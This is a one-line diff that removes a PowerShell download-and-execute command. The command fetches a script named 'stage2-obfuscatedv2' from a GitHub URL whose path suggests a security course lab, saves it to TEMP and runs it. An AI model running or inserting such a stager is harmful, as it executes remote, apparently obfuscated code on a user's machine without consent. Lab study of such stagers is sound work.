@@ -1,1 +1,0 @@
-'powershell.exe -command "& { (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/kwafula/kwafula.github.io/refs/heads/main/CSC846-Lab08/stage2-obfuscatedv2', '$env:TEMP\stage2.ps1'); & '$env:TEMP\stage2.ps1' }"'
